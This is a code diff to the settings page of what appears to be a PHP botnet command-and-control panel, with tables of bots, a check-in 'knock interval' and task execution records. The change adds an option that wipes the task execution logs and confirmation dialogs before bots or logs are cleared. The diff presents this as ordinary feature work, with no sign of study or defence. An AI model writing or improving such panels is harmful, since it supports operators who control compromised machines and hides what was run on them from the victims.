@@ -94,7 +94,7 @@ include 'inc/stats.php';
 		<aside class="right-side">
 			<section class="content">
 				<div class="row">
-					<div class="col-lg-12 col-xs-24">
+					<div class="col-lg-7 col-xs-14">
 						<?php
 						if ($userperms != "admin")
 						{
@@ -104,7 +104,7 @@ include 'inc/stats.php';
 						if (isset($_GET['clear']))
 						{
 							$clear = strtolower($_GET['clear']);
-							$safe = array("dead", "offline", "dirty", "all");
+							$safe = array("dead", "offline", "dirty", "all", "tasklogs");
 							if (in_array($clear, $safe))
 							{
 								if ($clear == "dead")
@@ -122,12 +122,16 @@ include 'inc/stats.php';
 									$odb->query("DELETE FROM bots WHERE mark = '2'");
 									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared dirty bots from table', UNIX_TIMESTAMP()");
 									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
+								}else if ($clear == "tasklogs"){
+									$odb->query("TRUNCATE tasks_completed");
+									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared task execution logs from table', UNIX_TIMESTAMP()");
+									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
 								}else{
 									$odb->query("TRUNCATE bots");
 									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared all bots from table', UNIX_TIMESTAMP()");
 									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
 								}
-								echo '<div class="alert alert-success">Successfully cleared '.$clear.' bots from table. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
+								echo '<div class="alert alert-success">Successfully cleared entries. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
 							}else{
 								echo '<div class="alert alert-danger">Invalid clear option. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
 							}
@@ -161,7 +165,7 @@ include 'inc/stats.php';
 							</ul>
 							<div class="tab-content">
 								<div class="tab-pane active" id="main">
-									<form action="" method="POST" class="col-lg-3">
+									<form action="" method="POST" class="col-lg-6">
 										<label>Knock Interval</label>
 										<div class="input-group">
 											<input type="text" name="knock" class="form-control" value="<?php echo $odb->query("SELECT knock FROM settings LIMIT 1")->fetchColumn(0); ?>">
@@ -199,7 +203,8 @@ include 'inc/stats.php';
 									<a href="?p=settings&clear=dead" class="btn btn-danger">Clear Dead Bots</a>
 									<a href="?p=settings&clear=offline" class="btn btn-danger">Clear Offline Bots</a>
 									<a href="?p=settings&clear=dirty" class="btn btn-danger">Clear Dirty Bots</a>
-									<a href="?p=settings&clear=all" class="btn btn-danger">Clear All Bots</a>
+									<a onclick="ask('1')" class="btn btn-danger">Clear All Bots</a>
+									<a onclick="ask('2')" class="btn btn-danger">Clear Task Execution Logs</a>
 								</div>
 							</div>
 						</div>
@@ -211,5 +216,22 @@ include 'inc/stats.php';
 	<script src="js/jquery.min.js" type="text/javascript"></script>
 	<script src="js/bootstrap.min.js" type="text/javascript"></script>
 	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
+	<script type="text/javascript">
+		function ask(id)
+		{
+			if (id == "1")
+			{
+				if (confirm("WARNING: You are about to clear all of the bots from your database! Are you sure you want to do this?"))
+				{
+					setTimeout('window.location = "?p=settings&clear=all"', 1000);
+				}
+			}else{
+				if (confirm("WARNING: You are about to clear all task execution logs from your database! This could lead to inaccurate numbers on the Tasks page. Are you sure you want to do this?"))
+				{
+					setTimeout('window.location = "?p=settings&clear=tasklogs"', 1000);
+				}
+			}
+		}
+	</script>
 </body>
 </html>
